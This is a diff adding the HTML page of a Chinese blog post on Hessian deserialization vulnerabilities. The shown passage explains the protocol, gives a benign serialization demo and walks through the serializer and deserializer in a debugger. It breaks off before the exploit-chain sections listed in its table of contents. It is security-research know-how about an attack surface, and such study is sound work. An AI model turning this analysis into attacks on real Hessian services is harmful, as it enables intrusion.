@@ -1,0 +1,704 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 7.3.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Monda:300,300italic,400,400italic,700,700italic%7CRoboto+Slab:300,300italic,400,400italic,700,700italic%7CPT+Mono:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/all.min.css" integrity="sha256-XOqroi11tY4EFQMR9ZYwZWKj5ZXiftSx36RRuC3anlA=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/fancyapps-ui/5.0.31/fancybox/fancybox.css" integrity="sha256-gkQVf8UKZgQ0HyuxL/VnacadJ+D2Kox2TCEBuNQg5+w=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"f4nx1ng.github.io","root":"/","images":"/images","scheme":"Gemini","darkmode":false,"version":"8.20.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"copycode":{"enable":true,"style":"mac"},"fold":{"enable":false,"height":500},"bookmark":{"enable":true,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":true,"pangu":true,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInDown"}},"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="Hessian 是caucho公司的工程项目，为了达到或超过 ORMI&#x2F;Java JNI 等其他跨语言&#x2F;平台调用的能力设计而出，在 2004 点发布 1.0 规范，一般称之为 Hessian ，并逐步迭代，在 Hassian jar 3.2.0 之后，采用了新的 2.0 版本的协议，一般称之为Hessian 2.0。Hessian是一个二进制的序列化协议，Hessian自行定义了一套自己的">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Hessian反序列化漏洞解析">
+<meta property="og:url" content="https://f4nx1ng.github.io/2024/08/17/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E8%A7%A3%E6%9E%90/index.html">
+<meta property="og:site_name" content="f4nx1ng&#39;s blog">
+<meta property="og:description" content="Hessian 是caucho公司的工程项目，为了达到或超过 ORMI&#x2F;Java JNI 等其他跨语言&#x2F;平台调用的能力设计而出，在 2004 点发布 1.0 规范，一般称之为 Hessian ，并逐步迭代，在 Hassian jar 3.2.0 之后，采用了新的 2.0 版本的协议，一般称之为Hessian 2.0。Hessian是一个二进制的序列化协议，Hessian自行定义了一套自己的">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="e:\JAVA%E5%AE%89%E5%85%A8\Hessian\image\1.png">
+<meta property="og:image" content="e:\JAVA%E5%AE%89%E5%85%A8\Hessian\image\2.png">
+<meta property="og:image" content="e:\JAVA%E5%AE%89%E5%85%A8\Hessian\image\5.png">
+<meta property="og:image" content="e:\JAVA%E5%AE%89%E5%85%A8\Hessian\image\3.png">
+<meta property="og:image" content="e:\JAVA%E5%AE%89%E5%85%A8\Hessian\image\4.png">
+<meta property="og:image" content="e:\JAVA%E5%AE%89%E5%85%A8\Hessian\image\6.png">
+<meta property="og:image" content="e:\JAVA%E5%AE%89%E5%85%A8\Hessian\image\7.png">
+<meta property="og:image" content="e:\JAVA%E5%AE%89%E5%85%A8\Hessian\image\8.png">
+<meta property="og:image" content="e:\JAVA%E5%AE%89%E5%85%A8\Hessian\image\9.png">
+<meta property="og:image" content="e:\JAVA%E5%AE%89%E5%85%A8\Hessian\image\10.png">
+<meta property="og:image" content="e:\JAVA%E5%AE%89%E5%85%A8\Hessian\image\11.png">
+<meta property="og:image" content="e:\JAVA%E5%AE%89%E5%85%A8\Hessian\image\12.png">
+<meta property="og:image" content="e:\JAVA%E5%AE%89%E5%85%A8\Hessian\image\13.png">
+<meta property="og:image" content="e:\JAVA%E5%AE%89%E5%85%A8\Hessian\image\14.png">
+<meta property="og:image" content="e:\JAVA%E5%AE%89%E5%85%A8\Hessian\image\15.png">
+<meta property="og:image" content="e:\JAVA%E5%AE%89%E5%85%A8\Hessian\image\16.png">
+<meta property="og:image" content="e:\JAVA%E5%AE%89%E5%85%A8\Hessian\image\17.png">
+<meta property="og:image" content="e:\JAVA%E5%AE%89%E5%85%A8\Hessian\image\18.png">
+<meta property="og:image" content="e:\JAVA%E5%AE%89%E5%85%A8\Hessian\image\19.png">
+<meta property="og:image" content="e:\JAVA%E5%AE%89%E5%85%A8\Hessian\image\20.png">
+<meta property="og:image" content="e:\JAVA%E5%AE%89%E5%85%A8\Hessian\image\21.jpg">
+<meta property="og:image" content="e:\JAVA%E5%AE%89%E5%85%A8\Hessian\image\23.png">
+<meta property="og:image" content="e:\JAVA%E5%AE%89%E5%85%A8\Hessian\image\25.png">
+<meta property="og:image" content="e:\JAVA%E5%AE%89%E5%85%A8\Hessian\image\26.png">
+<meta property="og:image" content="e:\JAVA%E5%AE%89%E5%85%A8\Hessian\image\24.png">
+<meta property="og:image" content="e:\JAVA%E5%AE%89%E5%85%A8\Hessian\image\27.png">
+<meta property="og:image" content="e:\JAVA%E5%AE%89%E5%85%A8\Hessian\image\28.png">
+<meta property="og:image" content="e:\JAVA%E5%AE%89%E5%85%A8\Hessian\image\29.png">
+<meta property="og:image" content="e:\JAVA%E5%AE%89%E5%85%A8\Hessian\image\30.png">
+<meta property="og:image" content="e:\JAVA%E5%AE%89%E5%85%A8\Hessian\image\35.png">
+<meta property="og:image" content="e:\JAVA%E5%AE%89%E5%85%A8\Hessian\image\36.png">
+<meta property="og:image" content="e:\JAVA%E5%AE%89%E5%85%A8\Hessian\image\31.png">
+<meta property="og:image" content="e:\JAVA%E5%AE%89%E5%85%A8\Hessian\image\32.png">
+<meta property="og:image" content="e:\JAVA%E5%AE%89%E5%85%A8\Hessian\image\34.png">
+<meta property="og:image" content="e:\JAVA%E5%AE%89%E5%85%A8\Hessian\image\33.png">
+<meta property="og:image" content="e:\JAVA%E5%AE%89%E5%85%A8\Hessian\image\37.png">
+<meta property="og:image" content="e:\JAVA%E5%AE%89%E5%85%A8\Hessian\image\43.png">
+<meta property="og:image" content="e:\JAVA%E5%AE%89%E5%85%A8\Hessian\image\38.png">
+<meta property="og:image" content="e:\JAVA%E5%AE%89%E5%85%A8\Hessian\image\39.png">
+<meta property="og:image" content="e:\JAVA%E5%AE%89%E5%85%A8\Hessian\image\40.png">
+<meta property="og:image" content="e:\JAVA%E5%AE%89%E5%85%A8\Hessian\image\41.png">
+<meta property="og:image" content="e:\JAVA%E5%AE%89%E5%85%A8\Hessian\image\42.png">
+<meta property="article:published_time" content="2024-08-17T02:15:30.000Z">
+<meta property="article:modified_time" content="2024-08-17T02:16:58.448Z">
+<meta property="article:author" content="f4nx1ng">
+<meta property="article:tag" content="反序列化">
+<meta property="article:tag" content="Hessian">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="e:\JAVA%E5%AE%89%E5%85%A8\Hessian\image\1.png">
+
+
+<link rel="canonical" href="https://f4nx1ng.github.io/2024/08/17/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E8%A7%A3%E6%9E%90/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://f4nx1ng.github.io/2024/08/17/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E8%A7%A3%E6%9E%90/","path":"2024/08/17/Hessian反序列化漏洞解析/","title":"Hessian反序列化漏洞解析"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>Hessian反序列化漏洞解析 | f4nx1ng's blog</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">f4nx1ng's blog</p>
+      <i class="logo-line"></i>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="搜索" role="button">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签<span class="badge">9</span></a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类<span class="badge">5</span></a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">10</span></a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup"><div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off" maxlength="80"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close" role="button">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div class="search-result-container no-result">
+  <div class="search-result-icon">
+    <i class="fa fa-spinner fa-pulse fa-5x"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-4"><a class="nav-link" href="#hessian%E7%AE%80%E4%BB%8B"><span class="nav-number">1.</span> <span class="nav-text">Hessian简介</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E7%89%B9%E6%80%A7"><span class="nav-number">1.1.</span> <span class="nav-text">特性</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#hesssian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="nav-number">2.</span> <span class="nav-text">Hesssian反序列化</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%BA%8F%E5%88%97%E5%8C%96%E8%B0%83%E8%AF%95%E8%BF%87%E7%A8%8B"><span class="nav-number">2.1.</span> <span class="nav-text">序列化调试过程</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%B0%83%E8%AF%95%E8%BF%87%E7%A8%8B"><span class="nav-number">2.2.</span> <span class="nav-text">反序列化调试过程</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8"><span class="nav-number">3.</span> <span class="nav-text">Hessian反序列化利用</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#rome%E5%88%A9%E7%94%A8%E9%93%BE%E9%9D%9Esignedobejct"><span class="nav-number">3.1.</span> <span class="nav-text">rome利用链——非signedobejct</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#%E9%97%AE%E9%A2%98%E6%89%80%E5%9C%A8"><span class="nav-number">3.1.1.</span> <span class="nav-text">问题所在</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#%E9%97%AE%E9%A2%98%E5%88%86%E6%9E%90"><span class="nav-number">3.1.2.</span> <span class="nav-text">问题分析</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#rome%E5%88%A9%E7%94%A8%E9%93%BEsignedobject%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="nav-number">3.2.</span> <span class="nav-text">rome利用链——signedobject二次反序列化</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#spring-aop%E5%88%A9%E7%94%A8%E9%93%BE"><span class="nav-number">3.3.</span> <span class="nav-text">Spring AOP利用链</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#rome%E7%9A%84spring%E5%88%A9%E7%94%A8%E9%93%BE"><span class="nav-number">3.3.1.</span> <span class="nav-text">rome的Spring利用链</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#hessian%E7%9A%84%E5%88%A9%E7%94%A8%E9%93%BE"><span class="nav-number">3.3.2.</span> <span class="nav-text">hessian的利用链</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#hessian%E7%9A%84rome-jdbc%E5%88%A9%E7%94%A8%E9%93%BE"><span class="nav-number">3.3.3.</span> <span class="nav-text">Hessian的Rome jdbc利用链</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%80%BB%E7%BB%93"><span class="nav-number">3.4.</span> <span class="nav-text">反序列化总结</span></a></li></ol></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="f4nx1ng"
+      src="/images/touxiang.jpg">
+  <p class="site-author-name" itemprop="name">f4nx1ng</p>
+  <div class="site-description" itemprop="description">A big noob</div>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <a href="https://github.com/f4nx1ng" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;f4nx1ng" rel="noopener me" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+  </div>
+
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://f4nx1ng.github.io/2024/08/17/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E8%A7%A3%E6%9E%90/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/touxiang.jpg">
+      <meta itemprop="name" content="f4nx1ng">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="f4nx1ng's blog">
+      <meta itemprop="description" content="A big noob">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="Hessian反序列化漏洞解析 | f4nx1ng's blog">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Hessian反序列化漏洞解析
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+      
+
+      <time title="创建时间：2024-08-17 10:15:30 / 修改时间：10:16:58" itemprop="dateCreated datePublished" datetime="2024-08-17T10:15:30+08:00">2024-08-17</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/JAVA%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">JAVA安全</span></a>
+        </span>
+    </span>
+
+  
+    <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv">
+      <span class="post-meta-item-icon">
+        <i class="far fa-eye"></i>
+      </span>
+      <span class="post-meta-item-text">阅读次数：</span>
+      <span id="busuanzi_value_page_pv"></span>
+    </span>
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><p>Hessian 是<a target="_blank" rel="noopener" href="https://caucho.com/">caucho</a>公司的工程项目，为了达到或超过
+ORMI/Java JNI 等其他跨语言/平台调用的能力设计而出，在 2004 点发布 1.0
+规范，一般称之为 Hessian ，并逐步迭代，在 Hassian jar 3.2.0
+之后，采用了新的 2.0 版本的协议，一般称之为Hessian
+2.0。Hessian是一个二进制的序列化协议，Hessian自行定义了一套自己的储存和还原数据的机制。对8种基础数据类型、3种递归类型、ref引用以及Hessian
+2.0中的内部引用映射进行了相关定义。这样的设计使得Hassian可以进行跨语言跨平台的调用。</p>
+<span id="more"></span>
+<h4 id="hessian简介">Hessian简介</h4>
+<p>Hessian 是<a target="_blank" rel="noopener" href="https://caucho.com/">caucho</a>公司的工程项目，为了达到或超过
+ORMI/Java JNI 等其他跨语言/平台调用的能力设计而出，在 2004 点发布 1.0
+规范，一般称之为 Hessian ，并逐步迭代，在 Hassian jar 3.2.0
+之后，采用了新的 2.0 版本的协议，一般称之为Hessian
+2.0。Hessian是一个二进制的序列化协议，Hessian自行定义了一套自己的储存和还原数据的机制。对8种基础数据类型、3种递归类型、ref引用以及Hessian
+2.0中的内部引用映射进行了相关定义。这样的设计使得Hassian可以进行跨语言跨平台的调用。</p>
+<h5 id="特性">特性</h5>
+<p>1.不需要继承Serializable</p>
+<p>2.反序列化后的字节流更小</p>
+<h4 id="hesssian反序列化">Hesssian反序列化</h4>
+<p>Hessian可以将Java对象序列化为二进制数据，并通过网络传输到远程系统，然后将二进制数据反序列化为远程系统可以理解的对象。通过使用二进制格式，Hessian可以提供更高效的数据传输和更低的网络开销，相对于文本协议（如XML或JSON）而言。</p>
+<p>Hessian支持各种Java基本类型和复杂对象的序列化和反序列化。它还提供了一种简单的方式定义服务接口和实现远程方法调用。因此，开发人员可以使用Hessian来构建基于Java的分布式系统，同时获得更高的性能和更好的跨平台兼容性。</p>
+<p>Hessian是基于<code>Field</code>机制来进行反序列化的，就是通过一些特殊的方法或者反射，直接对<code>Field</code>进行赋值，这与<code>Jackson</code>调用<code>getter、setter</code>是不同的，这种机制相对于基于<code>Bean</code>机制的攻击面要小，因为它们自动调用的方法要少。</p>
+<p>以下是一些基于<code>Field</code>机制进行反序列化的类：</p>
+<ul>
+<li>Java Serialization</li>
+<li>Kryo</li>
+<li>Hessian</li>
+<li>json-io</li>
+<li>XStream</li>
+</ul>
+<p>在pom文件当中添加如下的配置</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.caucho<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>hessian<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.0.63<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>我们可以写下如下的demo来进行测试，该demo不仅可以测试序列化过程也可以调试反序列化的过程十分的方便。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestSerial</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        Serial();</span><br><span class="line">        <span class="comment">//UnSerial();</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">Serial</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Student</span> <span class="variable">stu</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Student</span>(<span class="string">&quot;fanxing&quot;</span>, <span class="number">18</span>);</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">HessianOutput</span> <span class="variable">hessianOutput</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HessianOutput</span>(byteArrayOutputStream);</span><br><span class="line">        hessianOutput.writeObject(stu);</span><br><span class="line">        hessianOutput.close();</span><br><span class="line">        System.out.print(byteArrayOutputStream.toString());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">UnSerial</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="comment">// 先序列化</span></span><br><span class="line">        <span class="type">Student</span> <span class="variable">student</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Student</span>(<span class="string">&quot;fanxing&quot;</span>, <span class="number">18</span>);</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">HessianOutput</span> <span class="variable">hessian2Output</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HessianOutput</span>(byteArrayOutputStream);</span><br><span class="line">        hessian2Output.writeObject(student);</span><br><span class="line">        hessian2Output.close();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 反序列化</span></span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">byteArrayInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(byteArrayOutputStream.toByteArray());</span><br><span class="line">        <span class="type">HessianInput</span> <span class="variable">hessianInput</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HessianInput</span>(byteArrayInputStream);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">student1</span> <span class="operator">=</span> hessianInput.readObject();</span><br><span class="line">        System.out.println(student1.toString());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h5 id="序列化调试过程">序列化调试过程</h5>
+<p>使用hessianOutput.writeObject触发序列化过程，直接单步进入该过程。</p>
+<figure>
+<img data-src="E:\JAVA安全\Hessian\image\1.png" alt="1">
+<figcaption aria-hidden="true">1</figcaption>
+</figure>
+<p>单步进入后，会先判断传入对象是否为null，如果不是则会开始获取序列化器，从这一步就可以看出她所拿到的反序列化器是unsafeserializer。（这一步会进入getSerializer当中进行大量的判断，但是在前面的分支当中，其根本就没有进入任何一个分支，最后进入getDefaultSerializer里面使用this._isEnableUnsafeSerializer作为判断条件之一返回unsafeserializer）</p>
+<figure>
+<img data-src="E:\JAVA安全\Hessian\image\2.png" alt="2">
+<figcaption aria-hidden="true">2</figcaption>
+</figure>
+<p>在unsafeserializer里面会使用writeObjectBegin进行分流，最终通往不同的序列化函数</p>
+<figure>
+<img data-src="E:\JAVA安全\Hessian\image\5.png" alt="5">
+<figcaption aria-hidden="true">5</figcaption>
+</figure>
+<p>这里有一个奇怪的点，不管后面的分支是如何设置的，事实上writeObjectBegin就只会返回一个结果，也就是说ref只会有-2一种结果。另外一张图是writemapbegin当中的逻辑，后面也许会用到。</p>
+<figure>
+<img data-src="E:\JAVA安全\Hessian\image\3.png" alt="3">
+<figcaption aria-hidden="true">3</figcaption>
+</figure>
+<figure>
+<img data-src="E:\JAVA安全\Hessian\image\4.png" alt="4">
+<figcaption aria-hidden="true">4</figcaption>
+</figure>
+<p>接下来我们顺理成章的来到了writeobject10当中，前面这个循环是在获取对象的内置的一些属性也就是field，然后对这个属性做了两个操作，这个放在后面说。</p>
+<figure>
+<img data-src="E:\JAVA安全\Hessian\image\6.png" alt="6">
+<figcaption aria-hidden="true">6</figcaption>
+</figure>
+<p>第一个操作向序列化后的字符串写入这个field的name，使用的函数是writeString()，如下图所示，大致的流程就是先写一个"S"，表示接下来要写的field类型是String，然后通过几个隔断符(事实上这个并不是真正的隔断符，而是由实际含义的“隔断符”，长度右移八位+长度)将"S"和现在即将要写入的field名字隔开，然后使用printString写上field的名字。</p>
+<figure>
+<img data-src="E:\JAVA安全\Hessian\image\7.png" alt="7">
+<figcaption aria-hidden="true">7</figcaption>
+</figure>
+<figure>
+<img data-src="E:\JAVA安全\Hessian\image\8.png" alt="8">
+<figcaption aria-hidden="true">8</figcaption>
+</figure>
+<p>第二步写入field的值，这里用第二个field的值作为示例，fieldSerializers.serialize()，回调用对应类型的序列化方法，该序列化方法当中会使用对应类型的write方法向序列化字符串进行写入。writeInt和writeString是一样的先写一个I（writeString是S）表示这是一个Int型的属性值，然后分隔符(右移24+右移16+右移8)，然后属性值。</p>
+<figure>
+<img data-src="E:\JAVA安全\Hessian\image\9.png" alt="9">
+<figcaption aria-hidden="true">9</figcaption>
+</figure>
+<figure>
+<img data-src="E:\JAVA安全\Hessian\image\10.png" alt="10">
+<figcaption aria-hidden="true">10</figcaption>
+</figure>
+<p>序列化最后的最后会以一个结束符作为收尾，z</p>
+<figure>
+<img data-src="E:\JAVA安全\Hessian\image\11.png" alt="11">
+<figcaption aria-hidden="true">11</figcaption>
+</figure>
+<p>至此序列化的过程就全部结束了，我们回看生成的序列化数据，可以将它的格式写到下面</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Mt[类名长度右移8+类名长度]类名[字段名类型][字段名长度右移八位+字段名长度]字段名[字段值类型][字段值长度右移八位+字段值长度](该部分因情况而定)字段值.......z</span><br></pre></td></tr></table></figure>
+<p>这么看其实有点像php的序列化，都是类型、长度、值这些内容拼接起来的东西。</p>
+<h5 id="反序列化调试过程">反序列化调试过程</h5>
+<p>反序列化过程直接定位到readobject，该段代码逻辑会先获取序列化字符串当中的tag，也就是开头，由于开头的内容是不变的（只要是正常序列化）。所以tag的内容一般情况下都是77(M)</p>
+<figure>
+<img data-src="E:\JAVA安全\Hessian\image\12.png" alt="12">
+<figcaption aria-hidden="true">12</figcaption>
+</figure>
+<p>所以直接定位到case77的分支，该分支先获取序列化数据当中的type也就是类名，然后进入了readmap里面。</p>
+<figure>
+<img data-src="E:\JAVA安全\Hessian\image\13.png" alt="13">
+<figcaption aria-hidden="true">13</figcaption>
+</figure>
+<p>readmap函数的具体逻辑如下，当反序列化器不为null的时候，直接进入readmap过程。</p>
+<figure>
+<img data-src="E:\JAVA安全\Hessian\image\14.png" alt="14">
